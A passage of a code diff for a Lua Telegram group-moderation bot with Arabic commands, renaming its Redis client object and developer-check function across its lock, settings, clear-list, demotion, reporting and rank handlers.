+datahmade:del("lock_fwd.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "فتح الاغاني بالتقيد") then
-local tsX_o = database:get("lock_audeo.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_audeo.note:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم فتح الاغاني بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم فتح الاغاني بالتقييد")
-database:del("lock_audeo.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_audeo.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "فتح الصوت بالتقيد") then
-local tsX_o = database:get("lock_voice.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_voice.note:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم فتح الصوت بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم فتح الصوت بالتقييد")
-database:del("lock_voice.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_voice.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "فتح الجهات بالتقيد") then
-local tsX_o = database:get("lock_contact.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_contact.note:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم فتح الجهات بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم فتح الجهات بالتقييد")
-database:del("lock_contact.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_contact.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "فتح العربيه بالتقيد") then
-local tsX_o = database:get("lock_ar.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_ar.note:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم فتح العربيه بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم فتح العربيه بالتقييد")
-database:del("lock_ar.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_ar.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "فتح الانكليزيه بالتقيد") then
-local tsX_o = database:get("lock_en.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_en.note:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم فتح الانكليزيه بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم فتح الانكليزيه بالتقييد")
-database:del("lock_en.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_en.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "فتح المعرف بالتقيد") then
-local tsX_o = database:get("lock_username.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_username.note:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم فتح المعرف بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم فتح المعرف بالتقييد")
-database:del("lock_username.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_username.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "فتح بصمه الفيديو بالتقيد") then
-local tsX_o = database:get("lock_note.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_note.note:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم فتح بصمه الفيديو بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم فتح بصمه الفيديو بالتقييد")
-database:del("lock_note.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_note.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if (text == "فتح الروابط بالتقيد") then
-local tsX_o = database:get("lock_link.note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_link.note:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"☑️┇بالفعل تم فتح الروابط بالتقييد")
 else
 tsX000("lock",msg,"☑️┇تم فتح الروابط بالتقييد")
-database:del("lock_link.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_link.note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 ------------------------------------------------------------------------
 if text == ("اعدادات التقيد") then
-if database:get("lock_chat.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_chat.note:MohaMeD"..msg.chat_id_..bot_id) then
  mute_text = '✔┇'
 else
  mute_text = '✖┇'
  end
  ------------
-if database:get("lock_photo.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_photo.note:MohaMeD"..msg.chat_id_..bot_id) then
  mute_photo = '✔┇'
 else
  mute_photo = '✖┇'
  end
  ------------
-if database:get("lock_video.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_video.note:MohaMeD"..msg.chat_id_..bot_id) then
  mute_video = '✔┇'
 else
  mute_video = '✖┇'
  end
-if database:get("lock_note.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_note.note:MohaMeD"..msg.chat_id_..bot_id) then
  mute_note = '✔┇'
 else
  mute_note = '✖┇'
  end
  ------------
-if database:get("lock_gif.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_gif.note:MohaMeD"..msg.chat_id_..bot_id) then
  mute_gifs = '✔┇'
 else
  mute_gifs = '✖┇'
  end
  ------------
-if database:get("lock_audeo.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_audeo.note:MohaMeD"..msg.chat_id_..bot_id) then
  mute_music = '✔┇'
 else
  mute_music = '✖┇'
  end
  ------------
-if database:get("lock_inline.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_inline.note:MohaMeD"..msg.chat_id_..bot_id) then
  mute_in = '✔┇'
 else
  mute_in = '✖┇'
  end
  ------------
-if database:get("lock_voice.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_voice.note:MohaMeD"..msg.chat_id_..bot_id) then
  mute_voice = '✔┇'
 else
  mute_voice = '✖┇'
  end
  ------------
-if database:get("lock_link.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_link.note:MohaMeD"..msg.chat_id_..bot_id) then
  mute_links = '✔┇'
 else
  mute_links = '✖┇'
  end
  ------------
-if database:get("lock_files.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_files.note:MohaMeD"..msg.chat_id_..bot_id) then
  mute_doc = '✔┇'
 else
  mute_doc = '✖┇'
  end
-if database:get("lock_mark.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_mark.note:MohaMeD"..msg.chat_id_..bot_id) then
  mute_mdd = '✔┇'
 else
  mute_mdd = '✖┇'
  end
  ------------
-if database:get("lock_stecker.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_stecker.note:MohaMeD"..msg.chat_id_..bot_id) then
 lock_sticker = '✔┇'
 else
 lock_sticker = '✖┇'
  end
  ------------
-if database:get("lock_tag.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_tag.note:MohaMeD"..msg.chat_id_..bot_id) then
 lock_htag = '✔┇'
 else
 lock_htag = '✖┇'
  end
 
-if database:get("lock_sarha.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_sarha.note:MohaMeD"..msg.chat_id_..bot_id) then
 lock_cmd = '✔┇'
 else
 lock_cmd = '✖┇'
  end
  ------------
-if database:get("lock_username.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_username.note:MohaMeD"..msg.chat_id_..bot_id) then
 lock_tag = '✔┇'
 else
 lock_tag = '✖┇'
  end
  ------------
-if database:get("lock_contact.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_contact.note:MohaMeD"..msg.chat_id_..bot_id) then
 lock_contact = '✔┇'
 else
 lock_contact = '✖┇'
  end
  ------------
-if database:get("lock_en.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_en.note:MohaMeD"..msg.chat_id_..bot_id) then
 lock_english = '✔┇'
 else
 lock_english = '✖┇'
  end
  ------------
-if database:get("lock_ar.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_ar.note:MohaMeD"..msg.chat_id_..bot_id) then
 lock_arabic = '✔┇'
 else
 lock_arabic = '✖┇'
  end
  ------------
-if database:get("lock_fwd.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_fwd.note:MohaMeD"..msg.chat_id_..bot_id) then
 lock_forward = '✔┇'
 else
 lock_forward = '✖┇'
  end
-local ex = database:ttl( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_)
+local ex = datahmade:ttl( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_)
 if ex == -1 then
 exp_dat = 'لا نهائي'
 else
@@ -7318,7 +7180,7 @@ end
 
 
 if text == 'مسح المحظورين' then
-database:del('MohaMeD:'..bot_id..'banned:'..msg.chat_id_)
+datahmade:del('MohaMeD:'..bot_id..'banned:'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, 1, '🚷┇ تم مسح المحظورين من البوت  ', 1, 'md')
 end
 if text == 'مسح البوتات' then
@@ -7334,19 +7196,19 @@ bot.channel_get_bots(msg.chat_id_,cb)
 send(msg.chat_id_, msg.id_, 1, '🗑┇تم مسح جميع البوتات', 1, 'md')
 end
 if text == 'مسح المميزين' and is_mod(msg) then
-database:del('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_)
+datahmade:del('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, 1, '🗑┇ تم مسح  قائمة الاعضاء المميزين  ', 1, 'md')
 end
 if text == 'مسح القوانين' then
-database:del('MohaMeD:'..bot_id..'rules'..msg.chat_id_)
+datahmade:del('MohaMeD:'..bot_id..'rules'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, 1, '🗑┇تم مسح القوانين المحفوظه', 1, 'md')
 end
 if text == 'مسح الرابط' then
-database:del('MohaMeD:'..bot_id..'group:link'..msg.chat_id_)
+datahmade:del('MohaMeD:'..bot_id..'group:link'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, 1, '🗑┇تم مسح الرابط المحفوظ', 1, 'md')
 end
 if text == 'مسح المكتومين' then
-database:del('MohaMeD:'..bot_id..'muted:'..msg.chat_id_)
+datahmade:del('MohaMeD:'..bot_id..'muted:'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, 1, '🗑┇ تم مسح قائمه المكتومين ', 1, 'md')
 end
 
@@ -7363,13 +7225,13 @@ if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
 SendText(msg.chat_id_,msg.id_,"*📮┇ هاذا معرف قناة \n*")   
 return false 
 end      
-if database:sismember('MohaMeD:'..bot_id..'gbanned:',result.id_) then
+if datahmade:sismember('MohaMeD:'..bot_id..'gbanned:',result.id_) then
 kewd = 'محظور عام'
-elseif database:sismember('MohaMeD:'..bot_id..'banned:'..msg.chat_id_,result.id_) then
+elseif datahmade:sismember('MohaMeD:'..bot_id..'banned:'..msg.chat_id_,result.id_) then
 kewd = 'محظور'
-elseif database:sismember('MohaMeD:'..bot_id..'muted:'..msg.chat_id_,result.id_) then
+elseif datahmade:sismember('MohaMeD:'..bot_id..'muted:'..msg.chat_id_,result.id_) then
 kewd = 'مكتوم'
-elseif database:sismember('MohaMeD:'..bot_id..'res'..msg.chat_id_,result.id_) then
+elseif datahmade:sismember('MohaMeD:'..bot_id..'res'..msg.chat_id_,result.id_) then
 kewd = 'مقيد'
 else
 kewd = ' لا يوجد'
@@ -7388,7 +7250,7 @@ if text and text:match("^تنزيل الكل @(.*)$") and is_owner(msg) then
 local res = {string.match(text, "^(تنزيل الكل) @(.*)$")}
 function by_username(extra, result, success)
 if result.id_ then
-if is_devabass(result.id_) == true then
+if is_devahmads(result.id_) == true then
 send(msg.chat_id_, msg.id_, 1, "📮┇ لا تستطيع تنزيل المطور الاساسي", 1, 'md')
 return false 
 end
@@ -7398,15 +7260,15 @@ return false
 end      
 if redis:sismember('MohaMeD:'..bot_id..'dev',result.id_) then
 dev = 'المطور ،' else dev = '' end
-if database:sismember('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_, result.id_) then
+if datahmade:sismember('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_, result.id_) then
 crr = 'منشئ اساسي ،' else crr = '' end
-if database:sismember('MohaMeD:'..bot_id..'creator:'..msg.chat_id_, result.id_) then
+if datahmade:sismember('MohaMeD:'..bot_id..'creator:'..msg.chat_id_, result.id_) then
 cr = 'منشئ ،' else cr = '' end
-if database:sismember('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.id_) then
+if datahmade:sismember('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.id_) then
 own = 'مدير ،' else own = '' end
-if database:sismember('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.id_) then
+if datahmade:sismember('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.id_) then
 mod = 'ادمن ،' else mod = '' end
-if database:sismember('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.id_) then
+if datahmade:sismember('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.id_) then
 vip = 'مميز ،' else vip = ''
 end
 if ck_mod(result.id_,msg.chat_id_) ~= false then
@@ -7415,31 +7277,31 @@ else
 send(msg.chat_id_, msg.id_, 1, "\n🚸┇ليس لديه رتب حتى استطيع تنزيله \n", 1, 'md')
 end
 if RemBot(msg.sender_user_id_,msg.chat_id_) == 'sudo1' then
-database:srem('MohaMeD:'..bot_id..'dev', result.id_)
-database:del('MohaMeD:'..bot_id..'sudoo'..result.id_..'', 'no')
-database:srem('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_,result.id_)
-database:srem('MohaMeD:'..bot_id..'creator:'..msg.chat_id_, result.id_)
-database:srem('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.id_)
-database:srem('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.id_)
-database:srem('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.id_)
+datahmade:srem('MohaMeD:'..bot_id..'dev', result.id_)
+datahmade:del('MohaMeD:'..bot_id..'sudoo'..result.id_..'', 'no')
+datahmade:srem('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_,result.id_)
+datahmade:srem('MohaMeD:'..bot_id..'creator:'..msg.chat_id_, result.id_)
+datahmade:srem('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.id_)
+datahmade:srem('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.id_)
+datahmade:srem('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.id_)
 elseif RemBot(msg.sender_user_id_,msg.chat_id_) == 'sudo' then
-database:srem('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.id_)
-database:srem('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.id_)
-database:srem('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.id_)
-database:srem('MohaMeD:'..bot_id..'creator:'..msg.chat_id_, result.id_)
-database:srem('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_,result.id_)
+datahmade:srem('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.id_)
+datahmade:srem('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.id_)
+datahmade:srem('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.id_)
+datahmade:srem('MohaMeD:'..bot_id..'creator:'..msg.chat_id_, result.id_)
+datahmade:srem('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_,result.id_)
 elseif RemBot(msg.sender_user_id_,msg.chat_id_) == 'creato1' then
-database:srem('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.id_)
-database:srem('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.id_)
-database:srem('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.id_)
-database:srem('MohaMeD:'..bot_id..'creator:'..msg.chat_id_, result.id_)
+datahmade:srem('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.id_)
+datahmade:srem('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.id_)
+datahmade:srem('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.id_)
+datahmade:srem('MohaMeD:'..bot_id..'creator:'..msg.chat_id_, result.id_)
 elseif RemBot(msg.sender_user_id_,msg.chat_id_) == 'creato' then
-database:srem('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.id_)
-database:srem('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.id_)
-database:srem('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.id_)
+datahmade:srem('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.id_)
+datahmade:srem('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.id_)
+datahmade:srem('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.id_)
 elseif RemBot(msg.sender_user_id_,msg.chat_id_) == 'owner' then
-database:srem('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.id_)
-database:srem('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.id_)
+datahmade:srem('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.id_)
+datahmade:srem('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.id_)
 end
 else
 texts = '✖️┇خطاء'
@@ -7450,21 +7312,21 @@ resolve_username(res[2],by_username)
 end
 if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and is_owner(msg) then
 function promote_by_reply(extra, result, success)
-if is_devabass(result.sender_user_id_) == true then
-send(msg.chat_id_, msg.id_, 1, "📮┇ لا تستطيع تنزيل المطور الاساسي", 1, 'md')
+if is_devahmads(result.sender_user_id_) == true then
+send(msg.chat_id_, msg.id_, 1, "📮┇ دكعد راحه هاذ مطوري 😒 ", 1 , 'md')
 return false 
 end
 if redis:sismember('MohaMeD:'..bot_id..'dev',result.sender_user_id_) then
 dev = 'المطور ،' else dev = '' end
-if database:sismember('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_, result.sender_user_id_) then
+if datahmade:sismember('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_, result.sender_user_id_) then
 crr = 'منشئ اساسي ،' else crr = '' end
-if database:sismember('MohaMeD:'..bot_id..'creator:'..msg.chat_id_, result.sender_user_id_) then
+if datahmade:sismember('MohaMeD:'..bot_id..'creator:'..msg.chat_id_, result.sender_user_id_) then
 cr = 'منشئ ،' else cr = '' end
-if database:sismember('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_) then
+if datahmade:sismember('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_) then
 own = 'مدير ،' else own = '' end
-if database:sismember('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_) then
+if datahmade:sismember('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_) then
 mod = 'ادمن ،' else mod = '' end
-if database:sismember('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_) then
+if datahmade:sismember('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_) then
 vip = 'مميز ،' else vip = ''
 end
 if ck_mod(result.sender_user_id_,msg.chat_id_) ~= false then
@@ -7473,49 +7335,49 @@ else
 send(msg.chat_id_, msg.id_, 1, "\n🚸┇ليس لديه رتب حتى استطيع تنزيله \n", 1, 'md')
 end
 if RemBot(msg.sender_user_id_,msg.chat_id_) == 'sudo1' then
-database:srem('MohaMeD:'..bot_id..'dev', result.sender_user_id_)
-database:del('MohaMeD:'..bot_id..'sudoo'..result.sender_user_id_..'', 'no')
-database:srem('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_,result.sender_user_id_)
-database:srem('MohaMeD:'..bot_id..'creator:'..msg.chat_id_, result.sender_user_id_)
-database:srem('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_)
-database:srem('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
-database:srem('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
+datahmade:srem('MohaMeD:'..bot_id..'dev', result.sender_user_id_)
+datahmade:del('MohaMeD:'..bot_id..'sudoo'..result.sender_user_id_..'', 'no')
+datahmade:srem('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_,result.sender_user_id_)
+datahmade:srem('MohaMeD:'..bot_id..'creator:'..msg.chat_id_, result.sender_user_id_)
+datahmade:srem('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_)
+datahmade:srem('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
+datahmade:srem('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
 elseif RemBot(msg.sender_user_id_,msg.chat_id_) == 'sudo' then
-database:srem('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
-database:srem('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
-database:srem('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_)
-database:srem('MohaMeD:'..bot_id..'creator:'..msg.chat_id_, result.sender_user_id_)
-database:srem('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_,result.sender_user_id_)
+datahmade:srem('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
+datahmade:srem('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
+datahmade:srem('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_)
+datahmade:srem('MohaMeD:'..bot_id..'creator:'..msg.chat_id_, result.sender_user_id_)
+datahmade:srem('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_,result.sender_user_id_)
 elseif RemBot(msg.sender_user_id_,msg.chat_id_) == 'creato1' then
-database:srem('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
-database:srem('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
-database:srem('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_)
-database:srem('MohaMeD:'..bot_id..'creator:'..msg.chat_id_, result.sender_user_id_)
+datahmade:srem('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
+datahmade:srem('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
+datahmade:srem('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_)
+datahmade:srem('MohaMeD:'..bot_id..'creator:'..msg.chat_id_, result.sender_user_id_)
 elseif RemBot(msg.sender_user_id_,msg.chat_id_) == 'creato' then
-database:srem('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
-database:srem('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
-database:srem('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_)
+datahmade:srem('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
+datahmade:srem('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
+datahmade:srem('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.sender_user_id_)
 elseif RemBot(msg.sender_user_id_,msg.chat_id_) == 'owner' then
-database:srem('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
-database:srem('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
+datahmade:srem('MohaMeD:'..bot_id..'mods:'..msg.chat_id_, result.sender_user_id_)
+datahmade:srem('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.sender_user_id_)
 end
 end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
 end
 ------------------------------------------------------------------------
-if (text and text == "ابلاغ" and msg.reply_to_message_id_ ~= 0 and (not database:get("MohaMeD:mute:deleta:msg:"..bot_id..msg.chat_id_))) then 
-b = database:get("MohaMeD:user:deleteL:msg:"..msg.chat_id_..bot_id..msg.sender_user_id_)
+if (text and text == "ابلاغ" and msg.reply_to_message_id_ ~= 0 and (not datahmade:get("MohaMeD:mute:deleta:msg:"..bot_id..msg.chat_id_))) then 
+b = datahmade:get("MohaMeD:user:deleteL:msg:"..msg.chat_id_..bot_id..msg.sender_user_id_)
 if b and b == os.date("%x") then 
 send(msg.chat_id_, msg.id_, 1, "👤┇ لا يمكنك الابلاغ اكثر من مره في اليوم", 1, 'html')
 else
-database:set("MohaMeD:user:deleteL:msg:"..msg.chat_id_..bot_id..msg.sender_user_id_,os.date("%x"))
-y = database:get("tsahke:fel:o:me:"..bot_id..msg.chat_id_) or 10
-x = database:get("tsahke:fel:msg:me:"..bot_id..msg.chat_id_..msg.reply_to_message_id_) or 0
+datahmade:set("MohaMeD:user:deleteL:msg:"..msg.chat_id_..bot_id..msg.sender_user_id_,os.date("%x"))
+y = datahmade:get("tsahke:fel:o:me:"..bot_id..msg.chat_id_) or 10
+x = datahmade:get("tsahke:fel:msg:me:"..bot_id..msg.chat_id_..msg.reply_to_message_id_) or 0
 send(msg.chat_id_, msg.reply_to_message_id_, 1, "⚠┇تم الابلاغ على الرساله\n⚠┇تبقى {"..(y-(x+1)).."} حتى يتم حذف الرساله", 1, 'html')
-database:incr("tsahke:fel:msg:me:"..bot_id..msg.chat_id_..msg.reply_to_message_id_)
-if (database:get("tsahke:fel:msg:me:"..bot_id..msg.chat_id_..msg.reply_to_message_id_)) then 
-x = database:get("tsahke:fel:msg:me:"..bot_id..msg.chat_id_..msg.reply_to_message_id_)
-y = database:get("tsahke:fel:o:me:"..bot_id..msg.chat_id_) or 10
+datahmade:incr("tsahke:fel:msg:me:"..bot_id..msg.chat_id_..msg.reply_to_message_id_)
+if (datahmade:get("tsahke:fel:msg:me:"..bot_id..msg.chat_id_..msg.reply_to_message_id_)) then 
+x = datahmade:get("tsahke:fel:msg:me:"..bot_id..msg.chat_id_..msg.reply_to_message_id_)
+y = datahmade:get("tsahke:fel:o:me:"..bot_id..msg.chat_id_) or 10
 if tonumber(x) >= tonumber(y) then 
 send(msg.chat_id_, 0, 1, "⚠┇تم حذف الرساله", 1, 'html')
 delete_msg(msg.chat_id_, {[0] = msg.reply_to_message_id_})
@@ -7528,65 +7390,65 @@ if (text and text == "رتبتي") then
 if msg.sender_user_id_ == tonumber(sudo_add) then
 t = 'المطور الاساسي'
 elseif is_sudo(msg) then
-t = database:get("MohaMeD:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت '
+t = datahmade:get("MohaMeD:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت '
 elseif is_creatorbasic(msg) then
-t = database:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي '
-elseif (database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("MohaMeD:all_sl:"..database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
-t = database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
+t = datahmade:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي '
+elseif (datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("MohaMeD:all_if:"..datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
+t = datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
 elseif is_creator(msg) then
-t = database:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ  الكروب '
-elseif (database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("MohaMeD:all_sl:"..database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
-t = database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
+t = datahmade:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ  الكروب '
+elseif (datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("MohaMeD:all_if:"..datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
+t = datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
 elseif is_owner(msg) then
-t = database:get("MohaMeD:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب '
